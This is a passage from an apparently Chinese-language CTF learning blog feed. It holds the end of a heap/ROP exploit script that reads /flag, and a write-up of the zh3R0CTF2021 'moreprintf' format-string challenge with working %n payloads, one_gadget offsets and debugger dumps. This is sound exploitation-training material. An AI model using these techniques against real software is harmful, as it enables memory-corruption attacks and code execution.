----------------------------------------------- 3 set gadget into free_hook</span></span><br><span class=\"line\">free(<span class=\"number\">7</span>)</span><br><span class=\"line\">free(<span class=\"number\">8</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">name_edit(<span class=\"number\">0</span>,p64(free_hook)[:-<span class=\"number\">1</span>])</span><br><span class=\"line\">add(<span class=\"number\">8</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;8888&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">7</span>,<span class=\"number\">1</span>,p64(gadget)[:-<span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ---------------------------------------------- 4 在堆块中布置rop链</span></span><br><span class=\"line\">pl = p64(heap_addr+<span class=\"number\">0xb10</span>) + p64(p_rsi_r) + p64(<span class=\"number\">0</span>) + p64(open_addr)</span><br><span class=\"line\"><span class=\"comment\"># 这里要注意选择open返回的fd指针</span></span><br><span class=\"line\">pl+= p64(p_rdi_r) + p64(<span class=\"number\">4</span>) + p64(p_rsi_r) + p64(heap_addr+<span class=\"number\">0x500</span>) + p64(p_rdx_r12_r) + p64(<span class=\"number\">0x30</span>)*<span class=\"number\">2</span> + p64(read_addr)</span><br><span class=\"line\">pl+= p64(p_rdi_r) + p64(heap_addr+<span class=\"number\">0x500</span>) + p64(puts)</span><br><span class=\"line\">content_edit(<span class=\"number\">4</span>,pl)</span><br><span class=\"line\">name_edit(<span class=\"number\">0</span>,<span class=\"string\">&#x27;/flag\\x00\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#command = &#x27;b *&#x27;+ str(hex(gadget))+&#x27;\\n&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#dbg(command)</span></span><br><span class=\"line\"><span class=\"comment\"># ---------------------------------------------- 5 trigger</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\"># end</span></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/",
            "title": "pwn入门-47-zh3R0CTF2021-moreprintf",
            "date_published": "2023-11-12T15:40:29.000Z",
            "content_html": "<p>这个题还有一些奇奇怪怪的问题, 但是怕自己跑偏了,就暂时先放下了,后面有空再研究.(或许和fprintf的机制有关?</p>\n<p>​\t先复习一下格式化字符串,本来想看看之前自己写的笔记…看了一下后想起来了一句名言,大意就是你去修改一个很烂的项目不如重构….恩….写的太烂了…不如重写一篇…</p>\n<h1 id=\"格式化字符串漏洞基础\"><a href=\"#格式化字符串漏洞基础\" class=\"headerlink\" title=\"格式化字符串漏洞基础\"></a>格式化字符串漏洞基础</h1><h2 id=\"n\"><a href=\"#n\" class=\"headerlink\" title=\"%n\"></a>%n</h2><p>​\t为什么能写入值呢,就是这个%n,它是将之前已经打印的字符个数赋值给当前偏移处的指针指向的地址</p>\n<p>​\t例如%100×10$n: 将100写入第十个位置所保存的指针指向的地址(4字节), %$hn是2字节,%$hhn是1字节,%$lln是8字节</p>\n<h2 id=\"p\"><a href=\"#p\" class=\"headerlink\" title=\"%p\"></a>%p</h2><p>​\t%p %p %p %p %p %p %p %p %p %p </p>\n<p>​\t在b *fprintf+143也就是vprintf下断点,然后set $rdi&#x3D;_IO_stdout, 单步,就可以打印地址了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*RSI  <span class=\"number\">0x55555555b4c0</span> ◂— <span class=\"string\">&#x27;0x55555555b260 0x7ffff7af2151 0x7ffff7dcf8c0 0x7ffff7ff5540 0x7fffffffe470 0xb1dad8e32f5ad200 0x5555555552c0 0x7ffff7a03bf7 0x1 0x7fffffffe568\\n&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t前四个值和后四个值</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231112234114271.png\" alt=\"image-20231112234114271\"></p>\n<h2 id=\"c\"><a href=\"#c\" class=\"headerlink\" title=\"%c\"></a>%c</h2><p>​\tc是一个字符的意思, 在后面的exp中,%c%c%c%5c%hhn表示,前三次输出,都是输出一个字符,第四次是5个字符,然后一共是8个字节了,把8写入第5个位置的指针指向的地址.</p>\n<p>​\tset $rdi&#x3D;_IO_stdout  ( 其他版本呢?)</p>\n<p>​\t%caaa%cbbb%cccc%5cddd%hhn,</p>\n<p>​\t可以看到确实只打印了第一个字符,然后%5c是把不足的用空格补齐</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`aaaQbbb�ccc    @ddd</span><br></pre></td></tr></table></figure>\n\n<img src=\"/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/Snipaste_2023-11-08_20-04-22.jpg\" alt=\"Snipaste_2023-11-08_20-04-22\" style=\"zoom:50%;\">\n\n\n\n<p>​\t然后把值写到了第5个位置的指针指向的地址</p>\n<p>​\t用%c%c%c%5c%hhn试一下, 可以看到确实是改成了0x08</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/Snipaste_2023-11-08_20-09-31.jpg\" alt=\"Snipaste_2023-11-08_20-09-31\" style=\"zoom:50%;\">\n\n<p>​\t但在我这里应该是要改成0xc8 不过其实应该没影响,都是把read地方的值改成onegadget</p>\n<h3 id=\"任意地址写修改值\"><a href=\"#任意地址写修改值\" class=\"headerlink\" title=\"任意地址写修改值\"></a>任意地址写修改值</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%c%c%c%<span class=\"number\">5</span>c%hhn%*<span class=\"number\">8</span>$d%<span class=\"number\">186326</span>c%<span class=\"number\">5</span>$n</span><br></pre></td></tr></table></figure>\n\n<p>​\t</p>\n<p>​\t除了wp给的payload,换其他的很多都不行…为什么呢?? 仔细观察源码, <strong>有输入长度的限制的</strong>,  fgets(buffer, 31, stdin); </p>\n<p>​\t如果不是单纯做题而是研究一下打法的话,可以拓展一下长度试试,这样的话应该就好很多,(可以加系统调用限制,然后又是orw的一道题(x)) (或者直接在运行的时候改寄存器,修改读入长度)</p>\n<h4 id=\"修改ret返回值-x\"><a href=\"#修改ret返回值-x\" class=\"headerlink\" title=\"修改ret返回值(x)\"></a>修改ret返回值(x)</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>a:<span class=\"number\">00</span>d0│     <span class=\"number\">0x7fffffffe4a0</span> —▸ <span class=\"number\">0x555555555100</span> (_start) ◂— endbr64</span><br><span class=\"line\"><span class=\"number\">1b</span>:<span class=\"number\">00</span>d8│     <span class=\"number\">0x7fffffffe4a8</span> —▸ <span class=\"number\">0x5555555552af</span> (main+<span class=\"number\">198</span>) ◂— mov edi, <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">1</span>c:<span class=\"number\">00e0</span>│     <span class=\"number\">0x7fffffffe4b0</span> ◂— <span class=\"number\">0x7fffffffe4b0</span></span><br><span class=\"line\"><span class=\"number\">1</span>d:<span class=\"number\">00e8</span>│     <span class=\"number\">0x7fffffffe4b8</span> ◂— <span class=\"number\">0xb8204e953bb68d00</span></span><br><span class=\"line\"><span class=\"number\">1</span>e:<span class=\"number\">00f</span>0│ rbp <span class=\"number\">0x7fffffffe4c0</span> —▸ <span class=\"number\">0x5555555552c0</span> (__libc_csu_init) ◂— endbr64</span><br><span class=\"line\"><span class=\"number\">1f</span>:<span class=\"number\">00f</span>8│     <span class=\"number\">0x7fffffffe4c8</span> —▸ <span class=\"number\">0x7ffff7a03c87</span> (__libc_start_main+<span class=\"number\">231</span>) ◂— mov edi, eax</span><br><span class=\"line\">    </span><br><span class=\"line\">%c%c%c%<span class=\"number\">197</span>c%hhn%*<span class=\"number\">8</span>$d%????c%<span class=\"number\">5</span>$n</span><br></pre></td></tr></table></figure>\n\n\n\n<p>onegadget - (200 + 0x21c87 )就是要改的值了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x4f2a5</span> execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+<span class=\"number\">0x40</span>, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  rsp &amp; <span class=\"number\">0xf</span> == <span class=\"number\">0</span></span><br><span class=\"line\">  rcx == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0x4f302</span> execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+<span class=\"number\">0x40</span>, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsp+<span class=\"number\">0x40</span>] == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0x10a2fc</span> execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+<span class=\"number\">0x70</span>, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsp+<span class=\"number\">0x70</span>] == <span class=\"literal\">NULL</span></span><br></pre></td></tr></table></figure>\n\n<p>0x4f2a5- (200 + 0x21c87 ) &#x3D; 185686</p>\n<p>%c%c%c%197c%hhn%*8$d%185686c%5$n</p>\n<p>邪门,就是不出c8,概率比较小,可能和系统有关?</p>\n<p>改成0x18吧…</p>\n<p>%c%c%c%21c%hhn%*8$d%185862c%5$n</p>\n<p>但还是不行..</p>\n<p>问题出在这个函数没有ret的….那….. 所以覆盖了也没用…</p>\n<p>fprintf之后有ret 回main函数的exit, 是不是可以修改这里呢? 这里就是下面的main+198</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231116172117205.png\" alt=\"image-20231116172117205\"></p>\n<h4 id=\"改其他的函数指针-比如改main-198\"><a href=\"#改其他的函数指针-比如改main-198\" class=\"headerlink\" title=\"改其他的函数指针,比如改main+198\"></a>改其他的函数指针,比如改main+198</h4><p>0x556fe88e42af这里会执行到的,但是是把这里的值改了(用watch下断点查看)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>a:<span class=\"number\">00</span>d0│     <span class=\"number\">0x7ffca5108380</span> —▸ <span class=\"number\">0x556fe88e4100</span> (_start) ◂— endbr64</span><br><span class=\"line\"><span class=\"number\">1b</span>:<span class=\"number\">00</span>d8│     <span class=\"number\">0x7ffca5108388</span> —▸ <span class=\"number\">0x556fe88e42af</span> (main+<span class=\"number\">198</span>) ◂— mov edi, <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">1</span>c:<span class=\"number\">00e0</span>│     <span class=\"number\">0x7ffca5108390</span> ◂— <span class=\"number\">0x7ffca5108390</span></span><br><span class=\"line\"><span class=\"number\">1</span>d:<span class=\"number\">00e8</span>│     <span class=\"number\">0x7ffca5108398</span> ◂— <span class=\"number\">0x695c632b96376d00</span></span><br><span class=\"line\"><span class=\"number\">1</span>e:<span class=\"number\">00f</span>0│ rbp <span class=\"number\">0x7ffca51083a0</span> —▸ <span class=\"number\">0x556fe88e42c0</span> (__libc_csu_init) ◂— endbr64</span><br><span class=\"line\"><span class=\"number\">1f</span>:<span class=\"number\">00f</span>8│     <span class=\"number\">0x7ffca51083a8</span> —▸ <span class=\"number\">0x7fc96c879c87</span> (__libc_start_main+<span class=\"number\">231</span>) ◂— mov edi, eax</span><br></pre></td></tr></table></figure>\n\n\n\n<p>修改下内存测试下</p>\n<p>0x7f8d3724c000+0x4f2a5  &#x3D; 0x7f8d3729b2a5</p>\n<p>set *0x7ffc28b196d8&#x3D; 0x7f8d3729b2a5 (为啥一次设置不全呢?)</p>\n<p>set *0x7ffc28b196dc&#x3D; 0x7f8d</p>\n<p>这里会把这个值修改一下,但不知道后面会不会执行, 会执行!!!</p>\n<p>0x18: %c%c%c%21c%hhn%*8$d%185862c%5$n</p>\n<p>0x28: %c%c%c%37c%hhn%*8$d%185846c%5$n</p>\n<p> 但是没办法一次改完….得两次啊,不对,应该用%lln</p>\n<p>0x18: %c%c%c%21c%hhn%*8$d%185862c%5$lln</p>\n<p>0x28: %c%c%c%37c%hhn%*8$d%185846c%5$lln</p>\n<p>不过为什么好像没有改成8字节,还是4字节呢?</p>\n<p>以及,是否可以修改两次4字节呢… 方法有点多,但会越来越复杂…先暂时放一下</p>\n<h2 id=\"如何确定能到read\"><a href=\"#如何确定能到read\" class=\"headerlink\" title=\"如何确定能到read\"></a>如何确定能到read</h2><p>​\t那就算修改了read, 怎么确定一定会执行到read呢, 不是执行到read,而是执行到栈里的这个地方,把那里的值改了,看wp一头雾水,wp中的调用链在本地测试不是这样</p>\n<p>​\t<font color=\"red\">所以我感觉有几份就是瞎扯淡,瞎蒙的(不过也可能是自己认识不足</font></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231108230705755.png\" alt=\"image-20231108230705755\"></p>\n<p>​\t是在vprift里面触发的</p>\n<p>​\t哦卧槽,这和栈的结构有关….?? 为什么返回地址会到这呢??</p>\n<p>​\t改rsp上面那个值才行</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>c:<span class=\"number\">00e0</span>│     <span class=\"number\">0x7ffd959070f0</span> —▸ <span class=\"number\">0x7ffd95907008</span> ◂— <span class=\"number\">0x7f2523745be7</span></span><br><span class=\"line\"><span class=\"number\">1</span>d:<span class=\"number\">00e8</span>│     <span class=\"number\">0x7ffd959070f8</span> ◂— <span class=\"number\">0xbaa72d067a954f00</span></span><br><span class=\"line\"><span class=\"number\">1</span>e:<span class=\"number\">00f</span>0│ rbp <span class=\"number\">0x7ffd95907100</span> —▸ <span class=\"number\">0x562fc10992c0</span> (__libc_csu_init) ◂— endbr64</span><br><span class=\"line\"><span class=\"number\">1f</span>:<span class=\"number\">00f</span>8│     <span class=\"number\">0x7ffd95907108</span> —▸ <span class=\"number\">0x7f25dc8e7bf7</span> (__libc_start_main+<span class=\"number\">231</span>) ◂— mov edi, eax</span><br><span class=\"line\">pwndbg&gt; bt</span><br><span class=\"line\">#<span class=\"number\">0</span>  <span class=\"number\">0x00007f2523745be7</span> in ?? ()</span><br><span class=\"line\">#<span class=\"number\">1</span>  <span class=\"number\">0x0000003000000030</span> in ?? ()</span><br><span class=\"line\">#<span class=\"number\">2</span>  <span class=\"number\">0x00007ffd959070f8</span> in ?? ()</span><br><span class=\"line\">#<span class=\"number\">3</span>  <span class=\"number\">0x00007ffd95907030</span> in ?? ()</span><br><span class=\"line\">#<span class=\"number\">4</span>  <span class=\"number\">0xbaa72d067a954f00</span> in ?? ()</span><br><span class=\"line\">#<span class=\"number\">5</span>  <span class=\"number\">0x00007f25dccb1a00</span> in ?? () from ./libc.so<span class=\"number\">.6</span></span><br><span class=\"line\">#<span class=\"number\">6</span>  <span class=\"number\">0x00007f25dccae2a0</span> in ?? () from ./libc.so<span class=\"number\">.6</span></span><br><span class=\"line\">#<span class=\"number\">7</span>  <span class=\"number\">0x0000562fc300d260</span> in ?? ()</span><br><span class=\"line\">#<span class=\"number\">8</span>  <span class=\"number\">0x00007f25dc9d6151</span> in __GI___libc_read (fd=<span class=\"number\">-1785699856</span>, buf=<span class=\"number\">0x562fc300d27e</span>, nbytes=<span class=\"number\">0</span>) at ../sysdeps/unix/sysv/linux/read.c:<span class=\"number\">27</span></span><br><span class=\"line\">#<span class=\"number\">9</span>  <span class=\"number\">0x00007f25dccb38c0</span> in _IO_stdfile_2_lock () from ./libc.so<span class=\"number\">.6</span></span><br><span class=\"line\">#<span class=\"number\">10</span> <span class=\"number\">0x00007f25dcedf540</span> in ?? ()</span><br><span class=\"line\">#<span class=\"number\">11</span> <span class=\"number\">0xffffffffffffffb0</span> in ?? ()</span><br><span class=\"line\">#<span class=\"number\">12</span> <span class=\"number\">0x0000000000000000</span> in ?? ()</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">pwndbg&gt; tele $rsp<span class=\"number\">-0x10</span></span><br><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│     <span class=\"number\">0x7ffd95907000</span> —▸ <span class=\"number\">0x7ffd95907100</span> —▸ <span class=\"number\">0x562fc10992c0</span> (__libc_csu_init) ◂— endbr64</span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0008</span>│     <span class=\"number\">0x7ffd95907008</span> ◂— <span class=\"number\">0x7f2523745be7</span></span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0010</span>│ rsp <span class=\"number\">0x7ffd95907010</span> ◂— <span class=\"number\">0x3000000030</span> <span class=\"comment\">/* &#x27;0&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">0018</span>│     <span class=\"number\">0x7ffd95907018</span> —▸ <span class=\"number\">0x7ffd959070f8</span> ◂— <span class=\"number\">0xbaa72d067a954f00</span></span><br><span class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0020</span>│     <span class=\"number\">0x7ffd95907020</span> —▸ <span class=\"number\">0x7ffd95907030</span> —▸ <span class=\"number\">0x7f25dccb1a00</span> (_IO_2_1_stdin_) ◂— <span class=\"number\">0xfbad208b</span></span><br><span class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0028</span>│     <span class=\"number\">0x7ffd95907028</span> ◂— <span class=\"number\">0xbaa72d067a954f00</span></span><br><span class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0030</span>│     <span class=\"number\">0x7ffd95907030</span> —▸ <span class=\"number\">0x7f25dccb1a00</span> (_IO_2_1_stdin_) ◂— <span class=\"number\">0xfbad208b</span></span><br><span class=\"line\"><span class=\"number\">07</span>:<span class=\"number\">0038</span>│     <span class=\"number\">0x7ffd95907038</span> —▸ <span class=\"number\">0x7f25dccae2a0</span> (__GI__IO_file_jumps) ◂— <span class=\"number\">0x0</span></span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; tele $rsp<span class=\"number\">-0x8</span></span><br><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│     <span class=\"number\">0x7ffea6ecc4b8</span> —▸ <span class=\"number\">0x7fa5e518df44</span> (<span class=\"built_in\">fprintf</span>+<span class=\"number\">148</span>) ◂— mov rcx, qword ptr [rsp + <span class=\"number\">0x18</span>]</span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0008</span>│ rsp <span class=\"number\">0x7ffea6ecc4c0</span> ◂— <span class=\"number\">0x3000000030</span> <span class=\"comment\">/* &#x27;0&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0010</span>│     <span class=\"number\">0x7ffea6ecc4c8</span> —▸ <span class=\"number\">0x7ffea6ecc5a8</span> ◂— <span class=\"number\">0x3d76d5b605211900</span></span><br><span class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">0018</span>│     <span class=\"number\">0x7ffea6ecc4d0</span> —▸ <span class=\"number\">0x7ffea6ecc4e0</span> —▸ <span class=\"number\">0x7fa5e5514a00</span> (_IO_2_1_stdin_) ◂— <span class=\"number\">0xfbad208b</span></span><br><span class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0020</span>│     <span class=\"number\">0x7ffea6ecc4d8</span> ◂— <span class=\"number\">0x3d76d5b605211900</span></span><br><span class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0028</span>│     <span class=\"number\">0x7ffea6ecc4e0</span> —▸ <span class=\"number\">0x7fa5e5514a00</span> (_IO_2_1_stdin_) ◂— <span class=\"number\">0xfbad208b</span></span><br><span class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0030</span>│     <span class=\"number\">0x7ffea6ecc4e8</span> —▸ <span class=\"number\">0x7fa5e55112a0</span> (__GI__IO_file_jumps) ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">07</span>:<span class=\"number\">0038</span>│     <span class=\"number\">0x7ffea6ecc4f0</span> —▸ <span class=\"number\">0x55e932c72260</span> ◂— <span class=\"string\">&#x27;%c%c%c%5c%hhn%*8$d%186326c%5$n&#x27;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"题目分析\"><a href=\"#题目分析\" class=\"headerlink\" title=\"题目分析\"></a>题目分析</h1><h2 id=\"源代码\"><a href=\"#源代码\" class=\"headerlink\" title=\"源代码\"></a>源代码</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* gcc -o more-printf -fstack-protector-all more-printf.c */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">FILE *fp;</span><br><span class=\"line\"><span class=\"type\">char</span> *buffer;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> i = <span class=\"number\">0x8d9e7e558877</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">_Noreturn</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  <span class=\"comment\">/* Just to save some of your time */</span></span><br><span class=\"line\">  <span class=\"type\">uint64_t</span> *p;</span><br><span class=\"line\">  p = &amp;p;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Chall */</span></span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  buffer = (<span class=\"type\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x20</span> + <span class=\"number\">1</span>); <span class=\"comment\">//为啥要+1? 感觉好像不加也一样</span></span><br><span class=\"line\">  fp = fopen(<span class=\"string\">&quot;/dev/null&quot;</span>, <span class=\"string\">&quot;wb&quot;</span>);</span><br><span class=\"line\">  fgets(buffer, <span class=\"number\">0x1f</span>, <span class=\"built_in\">stdin</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (i != <span class=\"number\">0x8d9e7e558877</span>) &#123;</span><br><span class=\"line\">    _exit(<span class=\"number\">1337</span>);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    i = <span class=\"number\">1337</span>;</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(fp, buffer);</span><br><span class=\"line\">    _exit(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"逻辑分析\"><a href=\"#逻辑分析\" class=\"headerlink\" title=\"逻辑分析\"></a>逻辑分析</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl __noreturn <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v3[<span class=\"number\">2</span>]; <span class=\"comment\">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3[<span class=\"number\">1</span>] = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  v3[<span class=\"number\">0</span>] = (__int64)v3;</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  buffer = (<span class=\"type\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x21</span>uLL);</span><br><span class=\"line\">  fp = fopen(<span class=\"string\">&quot;/dev/null&quot;</span>, <span class=\"string\">&quot;wb&quot;</span>);</span><br><span class=\"line\">  fgets(buffer, <span class=\"number\">31</span>, <span class=\"built_in\">stdin</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( i != <span class=\"number\">0x8D9E7E558877</span>LL )</span><br><span class=\"line\">    _exit(<span class=\"number\">1337</span>);</span><br><span class=\"line\">  i = <span class=\"number\">1337LL</span>;</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(fp, buffer);</span><br><span class=\"line\">  _exit(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t能够看到没有溢出,有一次格式化字符串利用的机会, 我在想是不是可以直接把返回地址修改成onegadget呢? 答案没采用这种方法,<strong>后面证实确实不行,一个是没有ret, 换别的函数的ret没有合适的指针(存疑)</strong></p>\n<p>​\t先用%p泄露地址,能够看到第二个地址是比较特殊的, read函数,如果可以修改后面几个字节, 改为和onegadget一样,通过枚举,alsr偏移也一样的话,就可以getshell了,onegadget的话 0x4f3d5, 有五位不同, 枚举的话还是需要挺长时间的.. (不需要通过枚举,完全可以利用现有的指针),也就是第8个参数</p>\n<p>​\t__libc_start_main+231知道这里的值,加上偏移就是onegadget的值了!</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__libc_start_main+<span class=\"number\">231</span>: <span class=\"number\">0x7ffff7a03bf7</span></span><br><span class=\"line\">onegadget : <span class=\"number\">0x7ffff7a313d5</span></span><br><span class=\"line\">相差: onegadget-__libc_start_main+<span class=\"number\">231</span> = <span class=\"number\">0x2d7de</span> = <span 